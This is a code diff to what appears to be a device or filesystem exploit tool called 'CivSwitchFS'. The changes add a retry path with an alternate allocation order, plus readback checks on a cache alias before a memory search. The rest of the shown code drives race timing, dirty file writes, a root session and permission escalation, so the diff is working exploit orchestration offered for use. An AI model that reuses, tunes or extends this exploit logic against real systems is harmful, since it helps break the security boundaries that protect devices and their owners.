@@ -183,6 +183,8 @@ export async function run() {
         let canaryTimingSchedule = null;
         let attemptLimit = BASE_ATTEMPTS;
         let positiveWindowsTotal = 0;
+        let usePreReservation = false;
+        let preReservationFallbackUsed = false;
 
         await log("CivSwitchFS (no RPC) by Nerisma\n" +
             "Thanks to Slapah (civ port)\n" +
@@ -197,6 +199,10 @@ export async function run() {
         for (let attempt = 1; attempt <= attemptLimit; attempt++) {
             if (timingPersistence.stopRequested) return;
             await log("======== ATTEMPT " + attempt + " ========");
+            if (usePreReservation) {
+                await log("Retrying with the reservation group opened before " +
+                    "candidate storage.");
+            }
             if (timingPersistence.stopRequested) return;
             timingPersistence.currentAttempt = attempt;
             if (timingPersistence.resetPending) {
@@ -209,7 +215,8 @@ export async function run() {
             }
             // The hard-cap attempt verifies the last schedule without retuning.
             const result = await runTrackedAttempt(canaryTimingSchedule,
-                attempt < MAX_TOTAL_ATTEMPTS, timingPersistence);
+                attempt < MAX_TOTAL_ATTEMPTS, timingPersistence,
+                usePreReservation);
             positiveAttemptsTotal += result.positiveAttempts || 0;
             positiveWindowsTotal += result.positiveWindows || 0;
             qualifiedCanaryFlipsTotal += result.qualifiedCanaryFlips || 0;
@@ -245,6 +252,29 @@ export async function run() {
                         MAX_TOTAL_ATTEMPTS +
                         " is reserved to validate the adjusted schedule.");
                 }
+            }
+
+            if (result.retryWithPreReservation &&
+                !preReservationFallbackUsed &&
+                attempt < MAX_TOTAL_ATTEMPTS) {
+                preReservationFallbackUsed = true;
+                usePreReservation = true;
+                if (attempt === attemptLimit &&
+                    attempt < MAX_TOTAL_ATTEMPTS) {
+                    attemptLimit = attempt + 1;
+                    await log("Adding one attempt to test the alternate " +
+                        "candidate allocation order.");
+                }
+                await log("Cleanup was verified. The next attempt will open " +
+                    "the reservation group before candidate storage.");
+            } else if (result.retryWithPreReservation &&
+                !preReservationFallbackUsed) {
+                await log("The hard attempt limit was reached; the alternate " +
+                    "candidate allocation order was not tested.");
+            } else if (usePreReservation && result.preReservationTested) {
+                usePreReservation = false;
+                await log("The reservation-first candidate attempt finished; " +
+                    "later attempts will use the default order.");
             }
 
             if (attempt === attemptLimit) {
@@ -742,8 +772,12 @@ function reportAddressProgress(message) {
 // ---------------------------------------------------------------------------
 
 async function runTrackedAttempt(canaryTimingSchedule,
-    allowTimingAdjustments = true, timingPersistence = null) {
+    allowTimingAdjustments = true, timingPersistence = null,
+    usePreReservation = false) {
     const attemptState = {
+        usePreReservation: usePreReservation === true,
+        preReservationTested: false,
+        retryWithPreReservation: false,
         permissionProven: false,
         stoppedByUser: false,
         qualifiedCanaryFlips: 0,
@@ -1299,8 +1333,11 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         pktBuf: pktBuf,
         rootSession: handles.rootSession,
         storageHandle: handles.storageHandle,
-        workerStateSafe: control.workerStateSafe
+        workerStateSafe: control.workerStateSafe,
+        usePreReservation: attemptState.usePreReservation
     });
+    attemptState.preReservationTested =
+        attemptState.usePreReservation === true;
 
     if (candidateSetup?.candidateHandle && candidateSetup?.primeHex &&
         !candidateSetup?.failureReason) {
@@ -1351,6 +1388,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         config, helpers, REQ: packets.REQ,
         canaryQualified: candidateSetup.canaryQualified,
         candidateHandle: candidateSetup.candidateHandle,
+        preGroup: candidateSetup.preGroup,
         dirtyFilePath: scratch.dirtyFilePath,
         dirtyWriteBuf: control.dirtyWriteBuf,
         dirtyWritePkt: control.dirtyWritePkt,
@@ -1451,6 +1489,38 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         return;
     }
 
+    if (alias?.aliasInstalled) {
+        const aliasReadback = helpers.inspectCandidateCacheAlias(
+            handles.candidateHandle, {
+                config,
+                aliasControlHex: candidateSetup.aliasControlHex,
+                primeHex: candidateSetup.primeHex
+            });
+        await verboseLog("Cache alias readback=" + aliasReadback.state +
+            (aliasReadback.readbackHex
+                ? " · bytes=" + aliasReadback.readbackHex : "") +
+            (aliasReadback.detail
+                ? " · " + aliasReadback.detail : ""));
+
+        if (aliasReadback.state !== "aliased") {
+            await log("Cache alias readback is " + aliasReadback.state +
+                "; memory search is skipped.");
+            if (aliasReadback.state === "original" &&
+                !attemptState.usePreReservation) {
+                attemptState.retryWithPreReservation = true;
+            }
+            await stopAndCleanup({
+                reason: "Cache copy waves completed, but candidate readback " +
+                    "did not confirm the alias.",
+                scratch, handles, helpers, addressCopy,
+                candidateCacheNeedsRetirement:
+                    Boolean(alias?.candidateCacheNeedsRetirement),
+                workerStateSafe: alias?.workerStateSafe === true
+            });
+            return;
+        }
+    }
+
     if (!alias?.ok || !alias.aliasInstalled) {
         await stopAndCleanup({
             reason: "Cache alias installation was incomplete; " +
@@ -1532,6 +1602,18 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
                 formatCode(baseline?.readError) + "; prefixMatched=" +
                 Boolean(baseline?.prefixMatches) + "; dataBytes=" +
                 (baseline?.prevEnd || 0) + ").");
+            if (!attemptState.usePreReservation) {
+                attemptState.retryWithPreReservation = true;
+            }
+            await stopAndCleanup({
+                reason: "The memory snapshot did not pass its readback checks; " +
+                    "skipping the memory scan.",
+                scratch, handles, helpers, addressCopy,
+                candidateCacheNeedsRetirement:
+                    Boolean(alias.candidateCacheNeedsRetirement),
+                workerStateSafe: addressCopy.workerStateSafe
+            });
+            return;
         }
 
         await log("Searching memory for candidates...");
